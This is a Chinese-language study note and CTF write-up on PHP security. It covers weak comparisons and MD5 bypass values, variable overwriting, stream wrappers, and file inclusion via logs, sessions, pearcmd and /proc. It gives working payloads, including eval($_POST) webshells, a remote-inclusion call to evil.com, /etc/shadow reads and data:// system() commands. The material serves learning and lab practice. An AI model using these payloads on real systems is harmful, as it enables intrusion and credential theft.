# PHP函数安全

## **类型比较 "==" 和 "==="**

- 松散比较：使用两个等号 **==** 比较，只比较值，不比较类型。
- 严格比较：用三个等号 **===** 比较，除了比较值，也比较类型。

```php
echo (123 == "123")?1:0;
# 返回：1
echo (123 === "123")?1:0;
# 返回：0

$id = intval("12312a");
var_dump($id);
输出：12312
```

> **注: 字符串转成数字后会是 0**
>
> 在 PHP 中**类型转换**有一定的缺陷，如果一个 **字符串** 要转成数值类型，首先对字符串进行一个判断，如果字符串包含 **e** 、**.** 、**E** 则会作为 **float** 来取值，否则则为 **int** ，下面例子由于 a 没有包含任何东西，所以被当作 **int** 来处理了，这里要说明的是，如果字符串起始部分为 **数值** ，则采用 **起始的数值** ，否则一律为 **0**

```php
var_dump(0 == "a");
# 返回： 1（0 & 0 自然为1）

var_dump(111 == "111a");
# 返回： true
var_dump(111 == "1a");
# 返回： false
var_dump(100 == "1e2"); #采用科学计数法
# 返回：true
var_dump(23333 == "0x5b25"); #采用十六进制
# 返回：true
```



## php弱类型比较函数

**strcmp(str1,str2)** :  将 str1 的值与 str2 比较,如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。

> 可以用**数组**传递使它报错返回0，也可以根据题目情况利用字符串绕过比较  

**is_numeric()** : 用于检测数值是否为数值, 如果传入的是字符串，会先将字符串转换成数值

>  `is_numeric()` 在判断时，如果遇到一些特殊控制字符（如 `%00`绕过、`%0a` 换行、`%0b` 垂直制表符、`%0c` 换页、`%0d` 回车、`%09` Tab），这些字符会被"忽略"，导致判断结果和实际比较结果不一致。

**is_switch()** : 和类型转换大同小异, case会自动将字符转换成数值

> 所以在数值后加字符串可以绕过

**md5($ 字符串, $var2)** : 计算 **字符串** 的 MD5 散列值, md5 在处理哈希字符串的时候，如果 md5 编码后的哈希值是 **0e** （科学计数法）开头的，都一律解释为 0，

> 所以可以利用变量md5后变为以0e开头的数返回0的机制绕过md5弱比较，也可以传入数组绕过强比较，如果无法传入数组也可以利用md5碰撞 

```php
var_dump(0e912 == 0e112?1:0);   // 输出：1
```

> 常见 md5 以 0e 开头的值: 

**数值型**

```
240610708 0e462097431906509019562988736854 返回：0
314282422 0e990995504821699494520356953734 返回：0
571579406 0e972379832854295224118025748221 返回：0
903251147 0e174510503823932942361353209384 返回：0
$md5          md5($md5)
0e00275209979 0e551387587965716321018342879905
0e00506035745 0e224441551631909369101555335043
0e00540451811 0e057099852684304412663796608095
0e00678205148 0e934049274119262631743072394111
0e00741250258 0e899567782965109269932883593603
0e00928251504 0e148856674729228041723861799600
0e01350016114 0e769018222125751782256460324867
0e01352028862 0e388419153010508575572061606161
0e01392313004 0e793314107039222217518920037885
0e01875552079 0e780449305367629893512581736357
0e01975903983 0e317084484960342086618161584202
0e02042356163 0e335912055437180460060141819624
0e02218562930 0e151492820470888772364059321579
0e02451355147 0e866503534356013079241759641492
0e02739970294 0e894318228115677783240047043017
0e02760920150 0e413159393756646578537635311046
0e02784726287 0e433955189140949269100965859496
0e03298616350 0e851613188370453906408258609284
0e03393034171 0e077847024281996293485700020358
```

**字母型**

```
QLTHNDT 0e405967825401955372549139051580 返回：0
QNKCDZO 0e830400451993494058024219903391 返回：0
EEIZDOI 0e782601363539291779881938479162 返回：0
TUFEPMC 0e839407194569345277863905212547 返回：0
```



> **MD5中的两个比较特殊的**

- 一个是 MD5 加密后弱比较等于自身，这个字符串是 0e215962017

- 另一个是 MD5 加密后变成万能密码，这个字符串是 ffifdyop





## 变量覆盖漏洞

如果传入一个参数 **?id=1**，并且这个参数把原有的变量值给覆盖掉了则叫做 **变量覆盖漏洞**

**变量覆盖漏洞产生原因**

- **`$$` 使用不恰当**

  > 简单概括就是一个**可变变量( `$$`)** 获得了一个普通变量的值并作为这个可变变量的变量名
  >
  > ```php
  > $a = "A"; $$a = "B";  --> echo $A; // 输出 B ,$($a) -> $A
  > ```

- **extract() 函数使用不当** :  

  > **extract** (array,flags,prefix):默认情况下，若数组中的键名与代码中的其他变量名冲突则会覆盖该变量的值，如果想避免覆盖则需要修改**flags** 的值，如果想生成新变量则要用**prefix** 生成前缀 

  ```php
  $a = "Source";
  $array = array("a" => "JP", "b" => "RU", "c" => "US");
  extract($array);  // 可以一键把数组变成变量
  echo $a; // 输出 JP
  echo $b; // 输出 RU
  echo $c; // 输出 US
  ```

- **parse_str() 使用不当** : `parse_str() `: 可以把一个“字符串”拆分成“变量”

  > 正常情况：你传入 `parse_str("username=A")`，PHP 就会自动创建一个变量 `$username = 'A';`,这					常用于解析 URL 参数或拼接字符串时

  

- **register_globals（注册全局变量）为 On**

  > 设置为 `on` 的时候,通过 URL传递的参数会 **自动注册** 为全局变量

- **import_request_variables(,) 使用不当**

  > 功能和 `register_globals` 类似，但是更灵活。允许你把 GET、POST 或 Cookie 里的变量导入到全局作用域中,还可以设定导入变量的方法和变量的前缀.         这两个均在PHP 5.4 版本中被彻底删除



## 伪协议

> 简单来说, PHP 伪协议可以理解为 PHP 提供的一些 **"特殊通道"**。普通的文件操作函数（例如 `include`、`file_get_contents`) 通常只能读取硬盘上的真实文件,但用了伪协议之后,就能通过这些 "特殊通道" 做一些更厉害的事情 ---  比如读源码、执行命令、访问压缩文件里的内容等等。



### `php://filter`

> 数据过滤器, 常用于 **读取服务器上的 PHP 源码 ( 不被 PHP引擎解析直接输出那种 )**

```php
php://filter/read or write=/resource=数据流
```

- 可以设定一个或多个过滤器名称，以管道符`|`分隔。

- 同时 ,  write=< 写链的筛选列表> **可选**。可以设定一个或多个过滤器名称，以管道符`|`分隔。

  ```php
  php://filter/write=过滤器1|过滤器2/resource=你要写入的文件名
  ```

  - `string.rot13 rot13变换` 
  - `string.toupper  转大写字母`
  -  `string.tolower  转小写字母`
  -  `string.strip_tags 去除html、PHP语言标签 (PHP 7.4 彻底移除了这个过滤器。)`

举例解释说明( **绕过姿势** ): 

```php
php://filter/read=convert.base64-encode/resource=目标文件

php://filter/read=string.strip_tags/resource=你要写入的文件名
#如果想要绕过exit的同时写入一句话木马,则需要将一句话木马先用base64编码  
php://filter/write=string.strip_tags|convert.base64-decode/resource=你要写入的文件名
```

拆开来看：

- `php://filter/` —— 告诉 PHP："我要用过滤器通道"
- `read=` —— 表示我要"读"这个文件
- `convert.base64-encode` —— 把文件内容用 Base64 编码（因为源码里可能有特殊字符，直接显示会乱，Base64 编码后全是安全字符）,  对应的解码的是:  `convert.base64-decode`
- `resource=目标文件` —— 指定要读哪个文件



### `php://input`

`php://input` - 可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在**enctype="multipart/form-data"** 的时候`php://input` 是无效的( 因此无法直接在 hackbar读取)。常用于执行代码。 一般在 CTF 中用于执行 php 代码（**POST 发包**）

> `php://input` 做为 `include` 的直接参数时，php执行时会将post内容当作文件内容，即可以**把任意 PHP 代码"塞"进服务器执行**！

**依赖:** **allow_url_include = On**

```php
php://input	?wrappers=input + POST 代码
```



### `zip://` **/** `bzip2://` **/** `zlib://` 

> 都是**压缩流伪协议**，可以访问压缩包里面的子文件，可以不用指定后缀名为 .php，可修改为任意后缀。jpg、png、gif、xxx、etc…

**触发条件：**

- allow_url_fopen: off/on
- allow_url_include: off/on

**ZIP 使用：**

```
zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
```



### `file://` 

最直接的伪协议，用来**读取服务器本地文件系统上的任意文件**, 必须要绝对路径

> 注: 需要 `allow_url_fopen` 和 `allow_url_include` 都开启才能用于 `include` 等函数

**读取敏感文件**

```
?file=file:///etc/shadow      # 用户密码文件
?file=file:///var/log/apache2/access.log  # 网站访问日志
?file=file:///flag             # CTF 中常见的 flag 文件位置
```



-- -



# PHP 文件包含漏洞

**核心原理 :**  

开发者为了让代码复用,把头部、底部、配置写在了一个单独的文件里，然后用 `include()` 或 `require()` 等函数去调用。如果 **“调用哪个文件的” 的路径是被用户控制且未经过严格校验**，攻击者就可能通过构造恶意路径或文件，实现任意文件读取或代码执行。



## 文件包含分类

在文件包含中，主要分为 `本地` 和 `远程` 两种类别，分类取决于所包含文件位置的不同。这两种分类依赖于 `php.ini` 中的两个配置项

>**要求:**

- `allow_url_fopen`  规定是否允许从远程服务器或者网站检索数据(默认为On)
- `allow_url_include`  规定是否允许include/require远程文件(php5.2之后默认为Off)(远程文件包含必须开启）

> **特性:** 

- 若文件内容符合 PHP 语法规范，包含时不管扩展名是什么都会被 PHP 解析。

- 若文件内容不符合 PHP 语法规范则会暴漏其源码。

  

### **1.  本地文件包含（LFI）**

包含服务器本地已有的文件。

- ```php
  http://127.0.0.1/?filename=/etc/passwd
  http://127.0.0.1/?filename=./phpinfo.txt
  ```

- **实战中最经典的就是目录穿越**。

  比如服务器代码是 `include($_GET['page']);`,只需要在 URL 中输入:  `http://target.com/index.php?page=../../../../../../../etc/password`  ,这样就能把服务器底层的系统密码文件给 "偷" 出来。

#### LFI漏洞利用技巧

**1.配合文件上传使用**

有时候我们找不到文件上传漏洞，无法上传webshell时，可以先上传一个图片格式的webshell到服务器 ，再利用本地文件包含漏洞进行解析。

**例如:**

- 先上传包含一句话木马且有相关读取语句的文件  

```php
 <?php
   fwrite(fopen("shell.php","w"),'<?php eval($_POST[123]);?>);
 ?>
```

- 然后找到拥有文件包含漏洞的地址和相关查询字符串

- 最后将文件上传的地址包含在该查询字符串内即可

  

**2.包含Apache日志文件**

有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。

**利用条件:**  对日志文件可读且知道日志文件存储目录

- 找到日志文件的地址
- 传入想要执行的函数（直接访问名字有相关php代码的地址，日志文件会把该名称记录）
- 最后用文件包含漏洞包含日志文件地址，则可以执行传入进去的代码

> **注意:**
>
> - 一般情况下日志存储目录会被修改，需要读取服务器配置文件(htpd.conf,nginx.conf....)或者根据phpinfo()中的信息来得知
> - 日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式。



**3.包含SESSION文件**

可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。

**利用条件:**

- 找到Session内的可控变量
- Session文件可读写，并且知道存储路径

**session常见存储路径:**

```cmd
/var/lib/php/sess_PHPSESSID
/var/lib/php/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。
```



**4.包含临时文件**

php中上传文件，会创建临时文件。在linux下使用`/tmp`目录，而在windows下使用`C:\windows\temp`目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。

由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。

另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。

### **2.  远程文件包含（RFI）**

 让服务器去包含你外网服务器上的恶意文件。

> 比如你有一台 公网 服务器 `http://evil.com/shell.txt` (里面写着一句话木马), 你就可以让目标服务器去包含它 : `http://target.com/index.php?http://evil.com/shell.txt`



#### **一些常见的敏感目录信息路径**

> **Windows系统:**

- C:\boot.ini //查看系统版本
- C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件
- C:\windows\repair\sam //存储Windows系统初次安装的密码
- C:\ProgramFiles\mysql\my.ini //Mysql配置
- C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码
- C:\windows\php.ini //php配置信息

> **Linux/Unix系统:**

- /etc/password //账户信息
- /etc/shadow //账户密码信息
- /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件
- /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置
- /usr/local/app/php5/lib/php.ini //PHP相关配置
- /etc/httpd/conf/httpd.conf //Apache配置文件
- /etc/my.conf //mysql配置文件



## 文件包含协议

除了下面的这两种还有上面的伪协议中的 `php://` 部分

#### `file://`

> `file://` 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以`/`、`\`、`\`或 Windows 盘符开头的路径）提供的路径将**基于当前的工作目录**。 在很多情况下是脚本所在的目录，除非被修改了。 使用 CLI 的时候，目录默认是脚本被调用时所在的目录。

**条件**：

- allow_url_fopen：不受影响
- allow_url_include：不受影响

```php
## 用法
file://[ 文件的绝对路径和文件名]
file:///etc/passwd

## 举例:
http://127.0.0.1/?filename=file:///etc/passwd
```



#### `data://`

> 自 `PHP>=5.2.0` 起，可以使用 `data://` 数据流封装器，以传递相应格式的数据。**通常可以用来执行 PHP 代码**

**条件**：

- allow_url_fopen：on
- allow_url_include： on

**用法**

```php
data://text/plain,<?php phpinfo();
data://text/plain;base64,[Base64编码后的代码]
```



## bypass

> `pear` 和 `pecl` 是 PHP 的两个包管理工具 ( 类似于Python 的 pip)，在Docker任意的镜像版本中默认安装，安装路径为/uer/local/lib/php。而 `pearcmd.php` 就是它们的核心控制脚本。



### `pearcmd.php` 参数注入

> 当 `register_argc_argv = On`（Docker 环境默认开启）时，PHP 会把 URL 查询字符串（`?` 后面的内容）解析为命令行参数 `$argv`

当LFI 包含 `pearcmd.php` 后，可以通过 URL 参数向它传递 `pearcmd` 命令（如 `config-create`），让它帮我们在服务器上**写入一个内容可控的 PHP 文件**（Webshell），然后再包含这个文件来执行代码

**Payload 构成**

`pearcmd` 接收参数时，用 **+** 作为分隔符（代表空格），而不是常规的 `&` 或 `=`, `peclcmd` 类似.

```php
?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>+/var/www/html/shell.php
```

- **+config-create+**：告诉 `pearcmd` 执行创建配置文件命令。
- **&file=...**：这是 LFI 的参数，用于包含 `pearcmd.php` 本身。
- **/<?=eval($_POST[1])?>+**：`config-create` 的第一个参数，即要写入文件的内容（一个免杀的一句话木马）。
- **+/var/www/html/shell.php**：第二个参数，指定写入的目标路径。



### `/proc` 伪文件系统

是一个在 Linux 系统中用于访问内核内部数据结构、获取系统信息以及控制系统行为的虚拟文件系统。它提供了一种通过文件系统的方式查看和操作内核状态的机制

**1. /proc/self/environ（环境变量注入）**

- **原理**：`/proc/self/environ` 记录了当前进程的环境变量。其中，HTTP 请求头（如 `User-Agent`）会被完整记录在内。
- **利用**：用 Burp 发送请求，将 `User-Agent` 修改为 PHP 代码 `<?=phpinfo();?>` 或 `<?=system('cat /flag');?>`，然后 LFI 包含 `/proc/self/environ`。服务器在解析该文件时，会把 `User-Agent` 里的 PHP 代码当作文件内容执行。

**2. /proc/self/fd/（文件描述符包含）**

- **原理**：`/proc/self/fd/` 目录包含进程当前打开的所有文件描述符的链接。其中 **fd/0** 通常代表标准输入（`stdin`）。
- **利用**：结合 **php://input** 或 **POST 上传**，在请求体（Body）中直接放置 PHP 代码，同时 LFI 包含 `/proc/self/fd/0`。PHP 在读取 `fd/0` 时，可能直接读到并执行 POST 中的 Payload。

-- -



# wp

## rce

> 这里继续做之前rce没有做完的第2,7,8题

#### **【RCE-labs】Level 7**

题目源码:

```php
function hello_shell($cmd){
      // 如果 cmd 里面包含 "/flag" 或者 "空格"，就直接杀掉程序 (die)
    if(preg_match("/flag| /", $cmd)){
        die("WAF!");
    }
    system($cmd);  // 用 system 函数执行传入的参数
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;
```

这是典型的 空格 绕过, 可以尝试用 `%09` (Tab的编码) ,`%00`, `$IFS` 等进行绕过

这里尝试了列当前目录下的文件没有发现有包含 flag的文件, 列 `/` 目录下的文件也不行

后面想起了 flag 可能会默认存放在 `/flag` 下,就直接尝试了(也是运上了), 直接输出 flag 了

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029150524839.png)

------

#### **【RCE-labs】Level 8**

这题的注释也讲的很明显了,看代码也很清楚:

```php
function hello_shell($cmd){
    /*>/dev/null 将不会有任何回显，但会回显错误，加上 2>&1 后连错误也会被屏蔽掉*/
    system($cmd.">/dev/null 2>&1");  
    // GET 请求传入的参数会被system函数执行,但后面会拼接 >/dev/null 2>&1
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;
```

这里可以用 命令拼接符 `||` 进行绕过:

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029152925389.png)

就可以直接拿下 flag 啦

------

#### **【RCE-labs】Level 2**

这一关主要就是读源码和构造Payload, 题目中给出了三个函数,我们一个一个来看, 逻辑看第三个,漏洞是在第一个函数,随机函数是第二个函数随机出来的

```php
<?php 
include ("get_flag.php");
global $flag;

session_start(); // 开启 session

function hello_ctf($function, $content){
    global $flag;  // 这个题目里有说 get_flag.php 里有 $flag 变量, 这个文件中又将其置为了全局变量
    $code = $function . "(" . $content . ");"; // 用 随机函数拼接 post 的 content 传参构造传入函数 eval中的值
    echo "Your Code: $code <br>";
    eval($code);
}

// 这个函数用于从$func_list里的函数中 随机选取一个 代码执行函数 去拼接最后进入 eval() 函数里
function get_fun(){ 

    $func_list = ['eval','assert','call_user_func','create_function','array_map','call_user_func_array','usort','array_filter','array_reduce','preg_replace'];

    if (!isset($_SESSION['random_func'])) {
        $_SESSION['random_func'] = $func_list[array_rand($func_list)];
    }
    
    $random_func = $_SESSION['random_func'];

    $url_fucn = preg_replace('/_/', '-', $_SESSION['random_func']);
    
    echo "获得新的函数: $random_func ，去 https://www.php.net/manual/zh/function.".$url_fucn.".php 查看函数详情。<br>";

    return $_SESSION['random_func'];
}

function start($act){

    $random_func = get_fun();  // 生成随机函数
    
    if($act == "r"){ /* 通过发送GET ?action=r 的方式可以重置当前选中的函数 —— 或者你可以自己想办法可控它x */
        session_unset();
        session_destroy(); 
    }
/* 如果 GET 传参 为 action=r --> 就会重置 session会话, 即重新生成一个随机函数给你
   如果传入 action=submit就继续当前会话,并用 POST 请求中的 content的值构造 传入随机函数里的值,然后再将 随机函数放到 eval函数里
*/
    if ($act == "submit"){
        $user_content = $_POST['content']; 
        hello_ctf($random_func, $user_content);
    }
}

isset($_GET['action']) ? start($_GET['action']) : '';

highlight_file(__FILE__);

?>
```

以上可以知道我们需要做的是 选取一个 随机函数, 然后构造 请求体里的 content 内容, 即

```php
$code = 随机函数( content );
eval(  $code   );
```

这里的 随机函数你可以一直 用 `?action=r` 去刷新页面去获得一个你想要的 代码执行函数,例如 

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029160006918.png)

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029160104692.png)

然后我选了 `eval()`函数,接着改 GET请求为 POST, 改为 `?action=submit` 表示你要用当前随机函数, 再构造 content 请求体内容去绕过

因为 content 的值会直接被拼接到 随机函数里,而随机函数又会被放到 eval() 中执行, 所以我这里在 content里是这样写的:

```php
content=1);echo $flag;//

// 拼接进去后的 $code 
$code = 随机函数( 1);echo $flag;// );
eval(  $code   );
```

- `1)` : 绕过随机函数,使随机函数结束
- `echo $flag;` : 输出我们想要的flag
- `//` 注释掉 $code 后面的 `); `内容,后面eval() 就可以正常执行

这里我尝试后

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029170520588.png)

拿到 flag

------

#### **DD 加速器**

进入靶场后是这样的,点击了开始体验:

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029184647315.png)

下面有输出,题目也说了

```txt
D 师傅在服务器上部署了一个加速器，并且提供一个页面来 ping 游戏服务器……
```

问题应该是在 目标地址那里, 也就那里可以改

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029184820676.png)

这里 输入了 `ls`命令, 回显显示会默认 在前面拼接 `ping` 命令, 用 `;` 就好了

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029185116343.png)

很好,这里被耍了

这里实在不行了,去根目录下找里好久都没有找到 flag,连个影子都没有找到, 最后去找了别人的 wp,直接看 环境变量 `env` 就好了,真不行了

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029190840824.png)

这里根本没有想到,看来还是做的题不够多

------

#### **[SWPUCTF 2021 新生赛]babyrce**

打开靶场提示要添加cookie值去让文件包含 上级目录下的 next.php 文件,直接 用 hackbar

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029174919276.png)

这里成功读取出了 next.php 文件里的内容, 当前目录下还有一个 `
`rasalghul.php 文件,直接拼接URL,进入该文件
![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029175026795.png)

这个文件说用 GET请求传参 url 进去然后 正则拼配没有 空格的话就将 参数 放置到  `shell_exec` 函数中执行, 还贴心的帮你输出了( 因为这个函数执行后不额外输出是看不懂运行 结果的)



先看一下目录下还有什么文件

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029180032033.png)







这里也读取里一下 `zz.php` 文件,这是它的内容,,没有flag

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029181653004.png)

而这里也可以看出这题有最少两种解法

看一下 根目录下的文件

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029181559940.png)

读取flag:

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029182109246.png)

当然,用 `zz.php`传参也是可以的:

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029182130523.png)





## 函数安全

#### [SWPUCTF 2022 新生赛]奇妙的MD5

打开靶场, "奇妙的字符串" -->  MD5

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029204649164.png)

用 MD5的万能密码字符串:  `ffifdyop`

成功绕过,输出

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029204711858.png)

是 MD5的弱比较绕过,找到两个原本字符串不同但MD5都是 0e开头的即可

这里构造:

```php
?x=s878926199a&y=s155964671a
// 或者数组构造 ?x[]=1&y[]=2
```

回车后显示以下代码:

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029211124593.png)

这里要对 POST 传入的参数 `wqh` 和 `dsy` 的MD5值进行强比较且他们原来的值不能相等,这里只能用数组进行绕过

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029211431275.png)

拿到 flag



#### [SWPUCTF 2022 新生赛]funny_php

这题主要是代码审计出一些 PHP 的弱比较和一些绕过和MD5的绕过,且目的是要让上面的的$_SESSION数组从 `L1到L3`为真

```php
if(isset($_SESSION['L1'])&&isset($_SESSION['L2'])&&isset($_SESSION['L3'])){
        include('flag.php');
        echo $flag;
    } 
```

第一个函数: 绕过,让传入的 num的字符大小 <=3 且 数值 >999999999即可,用科学计数法: `?num=4e9`

```php
strlen($_GET['num'])<=3&&$_GET['num']>999999999
```

 第二个函数是要让传入的 str 值为 `NSSCTF`,但这个的前面又用了preg_replace函数将 NSSCTF 进行了替换, 这里可以用 "双写绕过", 即 `?str=NNSSCTFSSCTF`

```php
if(isset($_GET['str'])){
        $str = preg_replace('/NSSCTF/',"",$_GET['str']);
        if($str === "NSSCTF"){
            echo "wow";
            $_SESSION['L2'] = 1;           
```

这里还是 MD5 的弱比较绕过: 传入两个“不相等但 MD5 值弱比较相等”的字符串即可:  `md5_1=903251147&md5_2=314282422`

```php
if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
        if($_POST['md5_1']!==$_POST['md5_2']&&md5($_POST['md5_1'])==md5($_POST['md5_2'])){
            echo "Nice!";
            if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
                if(is_string($_POST['md5_1'])&&is_string($_POST['md5_2'])){
                    echo "yoxi!";
                    $_SESSION['L3'] = 1;
```

所以最终构造的 Payload 为

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029214419258.png)

拿到 flag

------



## 文件包含

#### **PHPinclude-labs 0** 

> **这关是体验关,主要是想告诉我们: **

- **文件包含是代码层面的执行**，不是简单的文本读取。
- **利用 php://filter 等伪协议**可以突破“代码会被执行”的限制，实现任意文件读取。

所以这里的拿flag的方法由很多,也可以帮助我们学习利用上面所学的 文件包含漏洞,这题还没有过滤

```php
<?php
isset($_GET['wrappers']) ? include($_GET['wrappers']) : '';
highlight_file(__FILE__);
?>
```

**法一: 直接通过 `include()`函数的文件包含并执行的特性读取**

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029220744428.png)

**法二: 利用`backdoor.txt 内容为: <?php @eval($_POST['ctf']); ?>`让当前页面代码包含文件 `backdoor.txt`文件并用 post传参读取**

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029221802586.png)

**法三: 伪协议读取源码再进行解码**

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029221943404.png)

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029222618411.png)

都可以拿到 flag

------



#### PHPinclude-labs-level1 ( file:// 协议)

 **``file://`** 是 PHP 的本地文件系统协议。它的标准语法是 `file:///绝对路径`

**`include()`** 特性，文件被引入后，PHP 引擎会把它当代码执行，所以如果文件本身就是是 php 代码,文件内容将不会输出到网页.



题目还加了`allow_url_include=Off`，所以用不了 `php://filter`、`php://input` 等伪协议。

```php
<?php
isset($_GET['wrappers']) ? include("file://".$_GET['wrappers']) : '';
highlight_file(__FILE__);
?>
```

所以这题直接不能读取到当前目录下的 flag.php文件(文件中`flag以静态变量形式存储在文件中`),只能读取到 /flag (该文件`flag以文本形式存储在文件中`)

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029223934003.png)

拿到flag

------



#### PHPinclude-labs-level2 ( data:// 协议_1)

如果传入的数据是PHP代码，就会执行代码：

```php
data://text/plain,<?php phpinfo();?>
data://text/plain,<?php eval($_POST['helloctf']);?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+

data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2hlbGxvY3RmJ10pOz8+
#  or 
data:text/plain
```

**题目源码:** 

```php
<?php
echo include("data://text/plain;base64,4pedKCrigbDilr/igbAqKeKXnEhlbGxvLUNURnd3");
isset($_GET['wrappers']) ? include("data://text/plain".$_GET['wrappers']) : '';
highlight_file(__FILE__);
?>
```

解题: 这题用了 `data://`协议,并且传入的参数会拼接到 `include()`函数里的 `data://text/plain` 后面, 所以构造Payload的时候注意构造像题目那样的例子的就行
但是这题很奇怪, 单纯传入这些是不行的

```php
?wrappers=,<?php system('cat /flag');?>
?wrappers=;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==

?wrappers=,<?php system('cat /var/www/html/flag.php');?>
?wrappers=;base64,PD9waHAgc3lzdGVtKCdjYXQgL3Zhci93d3cvaHRtbC9mbGFnLnBocCcpOz8+
```

后面去问了ds 老师, 建议是在对 php代码 进行了base64编码后再对 Payload进行URL编码, 因为这些 `<`、`?`、`(` 等特殊符号。浏览器和 Burp 甚至 Apache 服务器，遇到这些未编码的特殊字符，极易发生**截断、转义错误或者被 WAF 拦截**。

所以最终 Payload为

```php
// 对 ?wrappers=;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==在 bp 的重放器中选中再用 Ctrl + U进行URL编码
?wrappers=%3bbase64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg%3d%3d

```

拿到flag

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261029234051956.png)

------



#### PHPinclude-labs-level3 ( data:// 协议_2)

这题和上一题差不多,就是过滤了很多字符,例如 `%`, `/` , `=` 这些

```php
<?php
include("get_flag.php");
preg_match("/flag|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $_GET['wrappers']) ? '' : include("data://text/plain".$_GET['wrappers']);
highlight_file(__FILE__);
?>

```

构造 Payload:

```php
?wrappers=;base64,<?php system('cat /f???');?>
// <?php system('cat /f???');?> base64后--> PD9waHAgc3lzdGVtKCdjYXQgL2Y/Pz8nKTs/Pg==
// 删去末尾的 == (这个要被过滤的) 在进行URL编码
    
?wrappers=%3Bbase64,PD9waHAgc3lzdGVtKCdjYXQgL2Y/Pz8nKTs/Pg
// 这里提一嘴: 这里的Payload可以存在 %, /这些字符, 因为这个在Web 服务器在把请求交给 PHP 处理之前，会先自动进行一次 URL 解码

```

拼接URL拿到 flag:

![](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030003842891.png)

------



#### PHPinclude-labs-level6 ( php协议_简介)

> `php://` — 访问各个输入/输出流（I/O streams），PHP中最为复杂和强大的协议

这里以这题做示范进行对比

| 方法           | 参数                          | 用途                       | 依赖                   |
| :------------- | :---------------------------- | :------------------------- | :--------------------- |
| `php://input`  | `?wrappers=input` + POST 代码 | 直接执行 PHP 代码          | `allow_url_include=On` |
| `php://filter` | `?wrappers=filter/...`        | 读取文件内容（Base64编码） | 无特殊依赖             |

**网页源码**

```php
<?php 
include("get_flag.php");
// 使用 GET传参并再其前面拼接 php://
isset($_GET['wrappers']) ? include("php://".$_GET['wrappers']) : '';
highlight_file(__FILE__);
?>

```

本来想用 `php://filter` 的,但是这里用了没有回显,试了别的也是一样

![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-030257-4d158e-image.png)

就只能用 `php://input` 了,使用post请求传参顺利拿到 flag

![image](https://fastly.jsdelivr.net/gh/fishfish772/fish-photo/20261030-025336-3185e5-image.png)



------

#### PHPinclude-labs-level7 php协议_php://input

> php://input做为include的直接参数时，如题，php执行时会将post内容当作文件内容，要注意，php://input不支持post提交，其请求的参数格式是原生(Raw)的内容，无法使用hackbar提交，因为hackbar不支持raw方式

**依赖：** `allow_url_fopen`为 `On`

```php
<?php 
include("get_flag.php");
//wrappers的是传什么都可以,只要不是""就行
isset($_GET['wrappers']) ? include("php://input") : '';
highlight_file(__FILE__);
?>

```

和上题一样,按题目要求构造Payload: 用 POST请求,看代码加上请求路径和参数,构造 代码执行函数读取

